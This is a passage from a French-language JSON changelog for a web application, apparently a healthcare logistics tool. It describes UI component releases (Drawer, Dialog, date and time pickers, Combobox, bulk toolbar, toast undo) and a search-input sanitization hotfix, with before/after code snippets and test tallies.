          "after": "// 0.58.13 - BulkToolbar contextuelle\nconst [selected, setSelected] = useState(new Set());\n\n{/* Liste avec checkbox */}\n{patients.map(p => (\n  <PatientRow\n    p={p}\n    selected={selected.has(p.id)}\n    onSelect={(checked) => {\n      const next = new Set(selected);\n      checked ? next.add(p.id) : next.delete(p.id);\n      setSelected(next);\n    }}\n  />\n))}\n\n{/* Toolbar apparaît auto quand selected.size > 0 */}\n<BulkToolbar\n  count={selected.size}\n  onClear={() => setSelected(new Set())}\n  itemName='patient'\n  itemNamePlural='patients'\n  actions={[\n    { id: 'assign', label: 'Assigner',  icon: 'ti-user-check', onClick: bulkAssign },\n    { id: 'export', label: 'Exporter',  icon: 'ti-download',   onClick: bulkExport },\n    { id: 'delete', label: 'Supprimer', icon: 'ti-trash',      onClick: bulkDelete, variant: 'danger' },\n  ]}\n/>"
        }
      },
      { "code": "UI", "txt": "📬 REFONTE NOTIFICATIONS PANEL avec Drawer. L'ancien dropdown (className='notif-panel') était collé à la cloche dans la TopBar — peu confortable, masque la liste sur mobile, scroll difficile. Maintenant : (a) Drawer side='right' size='sm' (360px) qui glisse depuis la droite avec backdrop blur. (b) Header avec icon ti-bell + title 'Notifications' + subtitle dynamique ('X non lues' ou 'Tout est à jour'). (c) Footer sticky avec bouton 'Tout marquer comme lu' (uniquement si nonLues > 0). (d) Cards de notifications refondues : background gradient teal subtil si non lue, border teal, icon coloré dans badge 36x36 arrondi, titre + message + date relative, bouton suppression × hover rouge. (e) Empty state premium avec icon ti-bell-off géant + texte 'Aucune notification' centré. (f) Hover sur item : translateY(-1px) + shadow",
        "code_snippet": {
          "file": "app/NotifBell.js",
          "note": "Panel notifications transformé en Drawer côté droit",
          "lang": "jsx",
          "before": "// AVANT 0.58.13 - dropdown collé à la cloche\n<div className='notif-panel'>\n  <div className='notif-head'>\n    <b>Notifications</b>\n    {nonLues > 0 && <button>Tout marquer lu</button>}\n  </div>\n  <div className='notif-list'>\n    {items.map(n => <div className='notif-item'>...</div>)}\n  </div>\n</div>",
          "after": "// 0.58.13 - Drawer premium côté droit\n<Drawer\n  open={open}\n  onClose={() => setOpen(false)}\n  title='Notifications'\n  subtitle={nonLues > 0 ? `${nonLues} non lue${nonLues > 1 ? 's' : ''}` : 'Tout est à jour'}\n  icon='ti-bell'\n  side='right'\n  size='sm'\n  footer={nonLues > 0 ? (\n    <button onClick={readAll}>\n      <i className='ti ti-checks' /> Tout marquer comme lu\n    </button>\n  ) : null}\n>\n  {items.length === 0 ? <EmptyState /> : items.map(n => <NotifCard n={n} />)}\n</Drawer>"
        }
      },
      { "code": "UI", "txt": "🔄 MIGRATION dialogs.alert / dialogs.confirm legacy → Dialog premium (rétrocompatible 100%). L'ancien système dialogs (app/dialogs.js) était utilisé 28 fois dans 10 fichiers. Plutôt que de tout refactorer (risqué), on a fait déléguer en interne dialogs.alert() et dialogs.confirm() vers le nouveau composant Dialog premium via import dynamique. (a) Helper tryNewDialog qui import('./components/ui-premium/Dialog') et appelle Dialog[method]() avec mapping des props. (b) Mapping variant legacy → Dialog : primary→info, danger→danger, warning→warning, success→success. (c) Normalisation : dialogs.alert('texte simple') marche comme avant. (d) Fallback legacy (setConfirmGlobal / setAlertGlobal) conservé en cas d'erreur d'import. (e) SSR safe : if (typeof window === undefined) return null. Tous les 28 usages bénéficient automatiquement du nouveau design (backdrop blur, animations slide-up, header coloré, etc.) sans toucher au code appelant",
        "code_snippet": {
          "file": "app/dialogs.js",
          "note": "Migration douce dialogs legacy → Dialog premium",
          "lang": "js",
          "before": "// AVANT 0.58.13 - design legacy modale basique\nexport const dialogs = {\n  alert(options) {\n    return new Promise((resolve) => {\n      resolveAlert = resolve;\n      setAlertGlobal(typeof options === 'string' ? { message: options } : (options || {}));\n    });\n  },\n};",
          "after": "// 0.58.13 - délégation auto vers Dialog premium\nfunction tryNewDialog(method, options) {\n  if (typeof window === 'undefined') return null;\n  try {\n    return import('./components/ui-premium/Dialog').then((mod) => {\n      const D = mod.Dialog || mod.default;\n      return D[method](options);\n    });\n  } catch { return null; }\n}\n\nexport const dialogs = {\n  alert(options) {\n    const opts = typeof options === 'string' ? { message: options } : (options || {});\n    const variantMap = { primary: 'info', danger: 'danger', warning: 'warning', success: 'success' };\n    const newAttempt = tryNewDialog('alert', {\n      title: opts.title || 'Information',\n      message: opts.message,\n      variant: variantMap[opts.variant] || 'info',\n    });\n    if (newAttempt) return newAttempt;\n    // Fallback legacy si import échoue\n    return new Promise((resolve) => { resolveAlert = resolve; setAlertGlobal(opts); });\n  },\n};\n// → 28 usages dialogs.alert() partout dans l'app bénéficient\n//   automatiquement du nouveau design sans 1 ligne de code modifiée"
        }
      },
      { "code": "AI", "txt": "+42 tests Vitest (v058-13-ui-phase12.test.js) : version+SW (2), RangePicker (8 — use client + props + 5 presets + helpers + click outside + draft state + min/max + index), Stepper (10 — use client + props + 3 tailles + 3 états + connecteur + click logic + aria-current + sub-exports + Footer prev/next/submit + isLast vert), BulkToolbar (9 — use client + props + null si <=0 + displayCount + animation + variant danger + close rotate + badge gradient + index), Refonte NotifBell (6 — import Drawer + utilisation + subtitle dynamique + footer conditionnel + empty state + plus de notif-panel), Migration dialogs (6 — tryNewDialog + confirm délégué + alert délégué + variantMap + fallback legacy + SSR safe), Récap 17 composants (1). Total 3647 verts (+42)" },
      { "code": "DOC", "txt": "BILAN APRÈS 0.58.13 : 17 composants premium au total (ajout RangePicker, Stepper+sub-exports, BulkToolbar). Le panel de notifications passe d'un dropdown étroit à un Drawer confortable côté droit. Les 28 usages de dialogs.alert/confirm legacy adoptent automatiquement le design premium grâce au pattern de délégation transparente. Prochaines pistes : (a) Migrer interventions/page.js vers BulkToolbar (multi-sélection pour assignation groupée). (b) Stepper pour onboarding nouveau collaborateur. (c) RangePicker dans /statistiques pour filtrer la période d'analyse. (d) Composant ProgressBar (barre de progression linéaire pour uploads/exports). (e) Tooltip premium (au hover, avec arrow + délai)" }
    ],
    "themes": ["ui", "design-system"],
    "date": "4 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.58.13.html",
    "sqlFile": null
  },
  {
    "v": "0.58.12",
    "kind": "version",
    "titre": "🎨 UI PHASE 11 : TimePicker + Migration 5 selects modal interventions + Toast undo + Dialog (confirm/prompt/alert) + Drawer Side",
    "chantiers": [
      { "code": "UI", "txt": "⏰ COMPOSANT TIMEPICKER (app/components/ui-premium/TimePicker.js, 230 lignes). Complément du DatePicker pour les heures de RDV/intervention. (a) Trigger button cohérent avec DatePicker (background blanc, focus ring teal 3px, icon clock). (b) Dropdown avec créneaux générés selon step (15/30/60 min). (c) Props minTime / maxTime pour restreindre les horaires (ex: 08:00 → 19:00). (d) Auto-scroll vers la valeur sélectionnée à l'ouverture. (e) 3 tailles (sm/md/lg). (f) Bouton clear (×) hover rouge. (g) Keyboard navigation : Enter/Space/ArrowDown ouvre, Escape ferme. (h) A11y : role listbox + aria-selected + aria-haspopup/expanded",
        "code_snippet": {
          "file": "app/components/ui-premium/TimePicker.js",
          "note": "TimePicker premium avec créneaux configurables",
          "lang": "jsx",
          "before": "// AVANT 0.58.12 - input natif moche\n<input\n  type='time'\n  value={time}\n  onChange={(e) => setTime(e.target.value)}\n/>\n// → style natif OS différent partout, pas de step custom",
          "after": "// 0.58.12 - TimePicker premium\n<TimePicker\n  value={time}\n  onChange={setTime}\n  step={15}             // créneaux toutes les 15 min\n  minTime='08:00'       // horaires bureau\n  maxTime='19:00'\n  size='md'\n/>\n// → dropdown avec créneaux scroll, auto-scroll vers valeur,\n//   clear × hover rouge, design Aveho cohérent"
        }
      },
      { "code": "UI", "txt": "🎯 MIGRATION 5 SELECTS DU MODAL INTERVENTIONS — la modale 'Nouvelle DI' avait 5 <select> natifs. Tous migrés vers Select premium + l'input type=date remplacé par DatePicker. (a) Type de demande : Select avec icons ti-tag. (b) Échéance souhaitée : DatePicker (format français). (c) Matériel concerné : Select **searchable** avec icons ti-tool (liste souvent longue). (d) Patient concerné : Select **searchable** avec icons ti-user. (e) Dépôt : Select avec icons ti-building-warehouse. (f) Zone : Select avec icons ti-map-pin. Plus aucun <select> natif dans /interventions/page.js (vérifié par test)",
        "code_snippet": {
          "file": "app/interventions/page.js",
          "note": "Modal Nouvelle DI entièrement migré",
          "lang": "jsx",
          "before": "// AVANT 0.58.12 - 5 <select> natifs\n<select value={form.materiel_id} onChange={...}>\n  <option value=''>— Aucun —</option>\n  {refs.materiels.map((m) =>\n    <option key={m.value} value={m.value}>{m.label}</option>\n  )}\n</select>\n// → pas de search, style natif OS, scroll difficile sur listes longues",
          "after": "// 0.58.12 - Select premium avec recherche live\n<Select\n  value={form.materiel_id || ''}\n  onChange={(v) => setForm({ ...form, materiel_id: v })}\n  fullWidth\n  searchable       // ← recherche live indispensable\n  placeholder='— Aucun —'\n  options={[\n    { value: '', label: '— Aucun —', icon: 'ti-circle-dashed' },\n    ...refs.materiels.map((m) => ({\n      value: m.value, label: m.label, icon: 'ti-tool'\n    })),\n  ]}\n/>\n// → taper 3 lettres filtre la liste de 200+ matériels instantanément"
        }
      },
      { "code": "UI", "txt": "↩️ TOAST.UNDO() + Action button premium. (a) Refonte visuelle du bouton d'action dans les toasts : pill (border-radius 99px) avec background teinté de la couleur du type, border, icon ti-arrow-back-up, hover translateY + box-shadow. Plus de simple lien underline. (b) Nouveau helper toast.undo(title, onUndo) qui crée un toast success avec actionLabel='Annuler' et duration=6000ms (plus long pour laisser le temps de réagir). 6 helpers au total : success / info / warning / error / neutral / undo",
        "code_snippet": {
          "file": "app/components/ui-premium/Toast.js",
          "note": "Toast undo premium",
          "lang": "jsx",
          "before": "// AVANT 0.58.12 - feedback sans undo possible\nawait deletePatient(p.id);\ntoast.success('Patient supprimé');\n// → trop tard si l'utilisateur regrette",
          "after": "// 0.58.12 - toast.undo() avec restauration\nconst snapshot = { ...p };\nawait deletePatient(p.id);\ntoast.undo('Patient supprimé', async () => {\n  await restorePatient(snapshot);\n  toast.success('Restauration effectuée');\n});\n// → toast vert avec pill 'Annuler', 6 secondes pour réagir,\n//   restore propre via le snapshot avant suppression"
        }
      },
      { "code": "UI", "txt": "💬 COMPOSANT DIALOG (app/components/ui-premium/Dialog.js, 380 lignes). API impérative qui retourne une Promise — au-dessus de Modal mais avec une API ergonomique pour 3 cas d'usage courants. (a) **Dialog.confirm({title, message, danger, preview})** → Promise<boolean>. Variante danger force le header rouge terra. Le slot preview affiche un aperçu stylé code du contenu à supprimer. (b) **Dialog.prompt({title, message, defaultValue, placeholder, validate, multiline})** → Promise<string|null>. Validation custom : (val) => null si OK ou message d'erreur. Multiline=true affiche un textarea + raccourci Cmd/Ctrl+Enter pour valider. (c) **Dialog.alert({title, message, variant})** → Promise<void>. 4 variants : info / success / warning / danger. Implementation : monte un container DOM dynamiquement à la racine via ReactDOM.createRoot, retourne une Promise résolue à la fermeture",
        "code_snippet": {
          "file": "app/components/ui-premium/Dialog.js",
          "note": "API impérative ergonomique",
          "lang": "jsx",
          "before": "// AVANT 0.58.12 - boilerplate verbeux avec useState + Modal\nconst [showConfirm, setShowConfirm] = useState(false);\nconst [pendingPatient, setPendingPatient] = useState(null);\n\nfunction askDelete(p) {\n  setPendingPatient(p);\n  setShowConfirm(true);\n}\n\nfunction doDelete() {\n  setShowConfirm(false);\n  // ...delete logic\n}\n\n<Modal open={showConfirm} ...>...</Modal>",
          "after": "// 0.58.12 - Dialog.confirm() impératif\nasync function askDelete(p) {\n  const ok = await Dialog.confirm({\n    title: 'Supprimer ce patient ?',\n    message: 'Cette action est irréversible.',\n    danger: true,\n    preview: `${p.nom} ${p.prenom} — Chambre ${p.chambre}`,\n  });\n  if (ok) {\n    await deletePatient(p.id);\n    toast.undo('Patient supprimé', () => restore(p));\n  }\n}\n\n// Pareil pour Dialog.prompt :\nconst reason = await Dialog.prompt({\n  title: 'Motif de rejet',\n  placeholder: 'Expliquer pourquoi…',\n  validate: (v) => v.length < 10 ? 'Au moins 10 caractères' : null,\n  multiline: true,\n});\nif (reason) await reject(reason);"
        }
      },
      { "code": "UI", "txt": "📐 COMPOSANT DRAWER SIDE (app/components/ui-premium/Drawer.js, 230 lignes). Panneau latéral coulissant — alternative au Modal pour les longs formulaires ou les vues de détails. (a) Glisse depuis la droite ou la gauche (side='right'|'left'). (b) 4 tailles (sm 360px / md 480px / lg 640px / xl 800px) + width custom override. (c) Backdrop blur(6px) avec animation av-drawer-bg-in 220ms. (d) Animation av-drawer-slide-right ou left 320ms cubic-bezier. (e) Header avec brillance + decorative radial (cohérent avec Modal). (f) Close button avec rotation 90deg au hover. (g) Body scrollable indépendamment. (h) Footer sticky en bas. (i) Lock body scroll quand ouvert. (j) Focus trap + ESC + Tab cycle. (k) Closable au backdrop par défaut (closeOnBackdrop)",
        "code_snippet": {
          "file": "app/components/ui-premium/Drawer.js",
          "note": "Drawer pour formulaires longs",
          "lang": "jsx",
          "before": "// AVANT 0.58.12 - Modal trop étroit pour gros formulaire\n<Modal open={open} onClose={close} title='Modifier le patient' size='lg'>\n  {/* 50 champs entassés, scroll horrible */}\n  <form>...</form>\n</Modal>",
          "after": "// 0.58.12 - Drawer side coulissant\n<Drawer\n  open={open}\n  onClose={close}\n  title='Modifier le patient'\n  subtitle={`#${p.numero_dossier} — ${p.nom} ${p.prenom}`}\n  icon='ti-user-edit'\n  side='right'\n  size='lg'           // 640px\n  footer={\n    <>\n      <button className='btn-ghost' onClick={close}>Annuler</button>\n      <button className='btn-save' onClick={save}>Enregistrer</button>\n    </>\n  }\n>\n  <form>...</form>     {/* Plein de place + scroll dédié */}\n</Drawer>"
        }
      },
      { "code": "AI", "txt": "+38 tests Vitest (v058-12-ui-phase11.test.js) : version+SW (2), TimePicker (8 — use client+export, helpers toMinutes/toHHMM, props, useMemo slots, auto-scroll, click outside, keyboard, index export), Migration 5 selects interventions (6 — DatePicker import + 5 Selects + 0 select natif restant), Toast undo (4 — action pill stylisé + hover + undo helper + 6 helpers), Dialog (7 — use client + ConfirmDialog danger/preview + PromptDialog validate/multiline/Cmd-Enter + AlertDialog 4 variants + Dialog.* + ensureRoot/createRoot + animation timeout + index), Drawer (9 — use client + props + 4 sizes + slide-right/left + backdrop blur + body lock + focus trap + close rotation + index), Récap 14 composants (1). Total 3605 verts (+38)" },
      { "code": "DOC", "txt": "BILAN APRÈS 0.58.12 : 14 composants premium au total (ajout TimePicker, Dialog, Drawer). Modal Nouvelle DI complètement migré (5 selects + 1 date = 6 contrôles modernisés). Le composant Dialog ouvre la voie à supprimer le boilerplate Modal+useState pour les cas simples (confirm/prompt/alert) — l'ancien `dialogs.alert()` legacy reste compatible mais Dialog est plus moderne. Le Drawer Side va permettre de transformer plusieurs Modal trop chargés (édition patient, détails intervention, configuration etablissement) en panneaux latéraux confortables. Prochaines pistes : (a) RangePicker (sélection plage de dates avec preset 7j/30j/3mois/année). (b) Stepper (wizard multi-étapes pour onboarding/setup). (c) Toolbar contextuelle (action bar qui apparaît quand des items sont sélectionnés en bulk). (d) Refonte Notifications panel avec le composant Drawer. (e) Migrer dialogs.alert() legacy vers Dialog.alert() premium" }
    ],
    "themes": ["ui", "design-system"],
    "date": "4 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.58.12.html",
    "sqlFile": null
  },
  {
    "v": "0.58.11",
    "kind": "version",
    "titre": "🎨 UI PHASE 10 : HOTFIX recherche + Migration <select> + Modal API étendue + TabPanel + 3 Skeleton variants + DatePicker + Combobox",
    "chantiers": [
      { "code": "FIX", "txt": "🐛 HOTFIX GlobalSearch — corrige le 400 Bad Request sur PostgREST. Avant : taper 'ced=' dans la recherche globale envoyait `or=(numero.ilike.%ced=%25,type.ilike.%ced=%25)` à Supabase ; le `=` était interprété comme séparateur PostgREST, d'où le 400. Désormais le texte est passé dans `replace(/[=,()*]/g, '')` avant construction du term ilike : on supprime les caractères qui cassent la syntaxe `.or()` (=, virgule, parenthèses, étoile). Early-return si la query devient vide après nettoyage",
        "code_snippet": {
          "file": "app/GlobalSearch.js",
          "note": "Sanitize PostgREST chars dans la recherche globale",
          "lang": "js",
          "before": "// AVANT 0.58.11 - bug \"ced=\" produit 400 Bad Request\nif (activeFilter) filterType = activeFilter;\nconst term = `%${searchTerm}%`;\n// → `or=(numero.ilike.%ced=%25,...)` → 400 PostgREST\n//   car `=` est le séparateur entre opérateur et valeur",
          "after": "// 0.58.11 - sanitize avant query PostgREST\nif (activeFilter) filterType = activeFilter;\nconst safeSearch = searchTerm.replace(/[=,()*]/g, '').trim();\nif (!safeSearch) { setResults([]); setLoading(false); return; }\nconst term = `%${safeSearch}%`;\n// → query valide, 200 OK"
        }
      },
      { "code": "UI", "txt": "🎯 MIGRATION <select> NATIFS → Select premium. (a) /parametres : devise (Euro/CHF/USD) et format des dates → Select avec icons ti-currency-euro/franc/dollar et ti-calendar. (b) /interventions : filtres statut + type en haut de la liste → Select size=sm avec icons. Bénéfices : design cohérent avec la charte Aveho (au lieu du style natif OS qui change selon Windows/Mac/Mobile), focus ring teal, animations pop, support keyboard et a11y identique partout",
        "code_snippet": {
          "file": "app/parametres/page.js + app/interventions/page.js",
          "note": "Migration <select> → composant Select premium",
          "lang": "jsx",
          "before": "// AVANT 0.58.11 - style natif OS\n<select value={params.devise} onChange={(e) => setP('devise', e.target.value)}>\n  <option value='EUR'>Euro (€)</option>\n  <option value='CHF'>Franc suisse (CHF)</option>\n  <option value='USD'>Dollar US ($)</option>\n</select>",
          "after": "// 0.58.11 - Select premium custom\n<Select\n  value={params.devise || 'EUR'}\n  onChange={(v) => setP('devise', v)}\n  fullWidth\n  options={[\n    { value: 'EUR', label: 'Euro (€)', icon: 'ti-currency-euro' },\n    { value: 'CHF', label: 'Franc suisse (CHF)', icon: 'ti-currency-franc' },\n    { value: 'USD', label: 'Dollar US ($)', icon: 'ti-currency-dollar' },\n  ]}\n/>\n// → focus ring teal, icons, animation av-select-pop, keyboard, a11y complet"
        }
      },
      { "code": "UI", "txt": "🪟 REFONTE MODAL API — nouveaux props pour personnaliser finement le header. (a) `subtitle` : sous-titre sous le titre principal (white-translucide). (b) `iconBg` + `iconColor` : couleur du badge icon customisable (par défaut white avec inset shadow). (c) `headerActions` : slot React pour boutons à droite du title (avant le X). (d) `variant` : 'default' (header coloré) / 'minimal' (pas de header, close button floating avec rotate 90° hover) / 'danger' (header rouge terra forcé). (e) Taille `xl` ajoutée (920px). Le composant reste rétrocompatible — tous les anciens usages fonctionnent à l'identique",
        "code_snippet": {
          "file": "app/ui.js (Modal)",
          "note": "Nouvelle API plus expressive",
          "lang": "jsx",
          "before": "// AVANT 0.58.11 - API basique\n<Modal\n  open={open}\n  onClose={close}\n  title='Confirmer'\n  icon='ti-check'\n  color='#5aa05a'\n  size='md'\n>",
          "after": "// 0.58.11 - API étendue\n<Modal\n  open={open}\n  onClose={close}\n  title='Confirmer la suppression'\n  subtitle='Cette action est définitive'\n  variant='danger'           // header rouge terra forcé\n  size='lg'\n  headerActions={<button onClick={share}>↗ Partager</button>}\n>\n\n// OU - modal minimaliste sans header coloré\n<Modal\n  open={open}\n  onClose={close}\n  variant='minimal'         // close button floating\n  size='xl'                 // 920px\n>"
        }
      },
      { "code": "UI", "txt": "📑 ANIMATIONS ENTRE TABS — slide horizontal au lieu de fade. (a) Nouveau composant `<TabPanel active={activeTab}>` exporté depuis ui-premium qui utilise `key={active}` pour forcer un remount visuel et déclencher l'animation. (b) Keyframe CSS `av-tab-slide-in` : opacity 0 + translateX(20px) → opacity 1 + translateX(0) sur 280ms avec cubic-bezier(.2,.8,.2,1). (c) Class utility `.av-tab-content` pour usage rétrocompatible. (d) Intégré dans /parametres (3 tabs : Général, Notifications, RGPD) et /profil (4 tabs : Activité, Profil, Notifications, Sécurité). Les contenus glissent de droite à gauche en switchant" },
      { "code": "UI", "txt": "💀 3 NOUVEAUX SKELETON VARIANTS. (a) `SkeletonCard` : card autonome avec icon circle + label + valeur principale + détail + sparkline optionnel — pour mimiquer un KpiCard ou une MetricCard pendant le fetch. (b) `SkeletonAvatar` : avatar circulaire size customisable + nom + sous-titre optionnel — idéal pour listes d'utilisateurs/contacts. (c) `SkeletonKpi` : rangée de N cards alignées en grid (mimique d'une KpiRow). Tous les 3 utilisent l'animation shimmer existante",
        "code_snippet": {
          "file": "app/components/ui-premium/Skeleton.js",
          "note": "3 nouveaux variants prêts à l'emploi",
          "lang": "jsx",
          "before": "// AVANT 0.58.11 - 4 variants seulement\nimport { Skeleton, SkeletonText, SkeletonRow, SkeletonGrid }\n  from '../components/ui-premium';",
          "after": "// 0.58.11 - 7 variants\nimport {\n  Skeleton, SkeletonText, SkeletonRow, SkeletonGrid,\n  SkeletonCard, SkeletonAvatar, SkeletonKpi\n} from '../components/ui-premium';\n\n// Usage exemple : accueil pendant chargement KPIs\n{loading ? <SkeletonKpi count={4} /> : <KpiRow values={data} />}\n\n// Usage exemple : liste users\n{loading\n  ? Array.from({length: 5}).map((_, i) =>\n      <SkeletonAvatar key={i} size={36} showName showSub />)\n  : users.map(u => <UserRow user={u} />)}"
        }
      },
      { "code": "UI", "txt": "📅 COMPOSANT DATEPICKER CUSTOM (app/components/ui-premium/DatePicker.js, 175 lignes). Wrapper sur `<input type='date'>` natif qui : (a) affiche un trigger button au design premium identique au Select (background blanc, border 1.5px, focus ring teal 3px, hover border gris). (b) Format français long lisible (`4 juin 2026` au lieu de `2026-06-04`). (c) Icon calendrier ti-calendar-event (couleur navy si valeur, gris sinon). (d) Bouton clear (×) à droite si valeur, qui devient rouge au hover. (e) Ouvre le picker natif via showPicker() (Chrome/Edge moderne) ou click fallback (Safari/Firefox). (f) 3 tailles (sm/md/lg). (g) Props min/max pour limites. (h) A11y : aria-label + input natif accessible préservé en absolute opacity 0",
        "code_snippet": {
          "file": "app/components/ui-premium/DatePicker.js",
          "note": "Date picker premium avec format français",
          "lang": "jsx",
          "before": "// AVANT 0.58.11 - input natif moche, format ISO inconvivial\n<input\n  type='date'\n  value={birthday}\n  onChange={(e) => setBirthday(e.target.value)}\n/>\n// → affichage 2026-06-04, style natif OS différent partout",
          "after": "// 0.58.11 - DatePicker premium\n<DatePicker\n  value={birthday}\n  onChange={setBirthday}\n  label='Date de naissance'\n  min='1900-01-01'\n  max='2030-12-31'\n  size='md'\n/>\n// → affichage '4 juin 2026', design Aveho cohérent,\n//   showPicker() natif sous le capot pour fonctionnalité 100%"
        }
      },
      { "code": "UI", "txt": "🏷️ COMPOSANT COMBOBOX (app/components/ui-premium/Combobox.js, 280 lignes) — multi-select avec tags. Sélection multiple d'options affichées sous forme de pills cliquables. (a) Container clickable avec wrap automatique des tags. (b) Chaque tag = gradient teal subtil + border + icon optionnel + bouton × qui devient rouge au hover. (c) Animation av-tag-pop 200ms à l'ajout (scale + fade). (d) Recherche live optionnelle (searchable=true par défaut). (e) Options déjà sélectionnées filtrées du dropdown automatiquement. (f) Props maxTags pour limiter (avec affichage 'N/MAX sélectionnés' dans dropdown). (g) Auto-close du dropdown quand maxTags atteint. (h) A11y : role combobox/listbox/option + aria-expanded/haspopup",
        "code_snippet": {
          "file": "app/components/ui-premium/Combobox.js",
          "note": "Multi-select avec tags pour catégories, mots-clés, tags",
          "lang": "jsx",
          "before": "// AVANT 0.58.11 - pas de composant multi-select natif décent\n// → solutions ad-hoc avec checkboxes ou chips manuels partout",
          "after": "// 0.58.11 - Combobox premium\nconst [tags, setTags] = useState(['urgent', 'perfusion']);\n\n<Combobox\n  values={tags}\n  onChange={setTags}\n  options={[\n    { value: 'urgent', label: 'Urgent', icon: 'ti-alert-triangle', iconColor: '#c0392b' },\n    { value: 'perfusion', label: 'Perfusion', icon: 'ti-droplet' },\n    { value: 'vph', label: 'VPH', icon: 'ti-wheelchair' },\n    { value: 'ned', label: 'NED', icon: 'ti-pill' },\n  ]}\n  placeholder='Choisir des tags…'\n  searchable\n  maxTags={3}      // limite à 3 tags max\n/>\n// → tags pills avec animation pop, search live, × hover rouge"
        }
      },
      { "code": "UI", "txt": "🌙 DARK MODE pour les 3 nouveaux composants (Select, DatePicker, Combobox). Sélecteurs CSS génériques sur `[role='listbox']` et `[role='combobox']` qui s'appliquent automatiquement → background panel + border line + shadow noire profonde. Pas de spécificité par composant nécessaire, tout s'adapte" },
      { "code": "AI", "txt": "+46 tests Vitest (v058-11-ui-phase10.test.js) : version+SW (2), HOTFIX GlobalSearch (4 — safeSearch + sanitize chars + early return + term), Migration Select (2 — parametres devise/format + interventions filtres), Refonte Modal API (7 — subtitle + iconBg/iconColor + headerActions + variant + minimal floating + xl 920 + CSS), TabPanel (6 — export + key+animation + keyframe + class + parametres 3 + profil 4), Skeleton variants (4 — Card + Avatar + Kpi + index exports), DatePicker (8 — use client + export + props + tailles + formatDateFR + input caché + clear + showPicker), Combobox (8 — export + props + animation + add/remove + filter available + maxTags close + search/outside + a11y), Dark mode (2), Récap 22 composants exports (1). Total 3567 verts (+46)" },
      { "code": "DOC", "txt": "BILAN APRÈS 0.58.11 : 12 composants premium au total (ajout DatePicker, Combobox + extension Tabs avec TabPanel + 3 Skeleton variants). 6 chantiers UI livrés + 1 HOTFIX. Animations slide horizontal entre tous les tabs de l'app. Modal API qui permet maintenant tous les cas d'usage (danger, minimal, header personnalisé, headerActions). Prochaines pistes : (a) Time Picker (pour heures de RDV/intervention). (b) Migrer les <select> natifs restants progressivement (modals interventions ont 5 selects sur materiel/patient/depot/zone/type). (c) Toast Action button (toast.success avec un bouton 'Annuler' pour undo). (d) Composant Dialog amélioré (au-dessus du Modal API)" }
    ],
    "themes": ["ui", "design-system", "hotfix"],
    "date": "4 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.58.11.html",
    "sqlFile": null
  },
  {
    "v": "0.58.10",
    "kind": "version",
    "titre": "🎨 UI PHASE 9 : ZÉRO alert natif + FilterBar pills + Select custom + PageTransition + Pagination premium",
    "chantiers": [
      { "code": "UI", "txt": "🔔 TOAST.NEUTRAL() ajouté — raccourci pour les infos non-critiques (duration courte 2500ms). toast.info(), toast.warning() et toast.error() existaient déjà depuis 0.58.0. Maintenant 5 helpers : success / info / warning / error / neutral" },
      { "code": "UI", "txt": "🎯 ZÉRO ALERT() NATIF DANS TOUTE L'APP — Migration finale de 14 alerts natifs supplémentaires sur 9 pages. (a) /consent-verifications : 2 (export vide → toast.info, erreur export → toast.error). (b) /statistiques : 1 (erreur export CSV). (c) /statistiques-rgpd : 1 (erreur export PDF). (d) /changelog : 1 (erreur zip). (e) /audit : 1 (erreur export CSV). (f) /admin-perf : 1 (erreur reset). (g) /admin/medecins-prescripteurs : 3 (RPPS manquant, vérification, erreur). (h) /admin/doublons-forces : 1 (rollback). (i) /admin/prescriptions-archive : 3 (recherche, réseau, export). Total cumulé : **41 alert() natifs éliminés** depuis 0.58.7. **0 alert natif restant** confirmé par test scan",
        "code_snippet": {
          "file": "app/* (10 pages)",
          "note": "Migration finale alert() → toast",
          "lang": "jsx",
          "before": "// AVANT 0.58.7-10 - alert() bloquants partout\n// 41 alert() natifs sur 16 pages :\n// /interventions/kanban (1), /interventions (4), /patients (2),\n// /parametres-rgpd (10), /utilisateurs (6), /carte (4),\n// /consentements (3), /statistiques-activite (2), /maintenance (2),\n// /consent-verifications (2), /statistiques (1), /statistiques-rgpd (1),\n// /changelog (1), /audit (1), /admin-perf (1),\n// /admin/medecins-prescripteurs (3), /admin/doublons-forces (1),\n// /admin/prescriptions-archive (3)",
          "after": "// 0.58.10 - ZÉRO alert natif\n// → toast.error/success/info animés non-bloquants\n// → Stack vertical (multiples toasts simultanés OK)\n// → Swipe-to-dismiss\n// → Feedback positif visible (avant : silence sur succès)\n\n// Helpers disponibles :\ntoast.success('Sauvegardé !');\ntoast.error('Erreur réseau');\ntoast.info('Vérification en cours…');\ntoast.warning('Action irréversible');\ntoast.neutral('Lien copié');  // NEW : duration 2500ms\n\n// Vérifié par test scan automatique :\nexpect(violations).toEqual([]);  // ✅"
        }
      },
      { "code": "UI", "txt": "📍 FILTERBAR REFONTE PILLS MODERNES (CSS only, compat 100% du composant React). (a) Container pill arrondi 99px avec gradient subtil + border. (b) Label en uppercase letter-spacing. (c) Pills inactives avec hover translateY(-1px) + background blanc + border + shadow. (d) Pill active avec gradient 135deg #7CC8C8 → #5db5b5 + shadow multi-couches teal (4px+10px+inner). (e) Compteurs en pill avec background pill (rgba blanc 20% si actif, gris si inactif)",
        "code_snippet": {
          "file": "app/globals.css",
          "note": "FilterBar transformée en pills premium",
          "lang": "css",
          "before": "/* AVANT 0.58.10 - boutons basiques */\n.filter-bar{display:flex;gap:8px;align-items:center}\n.filter-bar-chip{\n  background:#f1f3f5;\n  border-radius:12px;\n  padding:5px 12px;\n}\n.filter-bar-chip.on{\n  background:#7CC8C8;\n  color:#fff;\n}",
          "after": "/* 0.58.10 - pills modernes */\n.filter-bar{\n  padding:5px;\n  background:linear-gradient(180deg,#fafbfc,#f4f7fa);\n  border:1px solid #e3e9ee;\n  border-radius:99px;  /* container pill */\n  width:fit-content;\n}\n.filter-bar-chip{\n  padding:7px 14px;\n  border-radius:99px;  /* pill */\n  background:transparent;\n  border:1px solid transparent;\n}\n.filter-bar-chip:hover:not(.on){\n  background:#fff;\n  border-color:#e3e9ee;\n  transform:translateY(-1px);\n  box-shadow:0 2px 4px rgba(20,33,49,.04);\n}\n.filter-bar-chip.on{\n  background:linear-gradient(135deg,#7CC8C8,#5db5b5);\n  box-shadow:\n    0 4px 10px rgba(124,200,200,.40),\n    0 2px 4px rgba(124,200,200,.30),\n    inset 0 -1px 2px rgba(0,0,0,.10);\n  transform:translateY(-1px);\n}\n.filter-bar-cnt{\n  background:rgba(255,255,255,.20);\n  border-radius:99px;  /* pill dans pill */\n}"
        }
      },
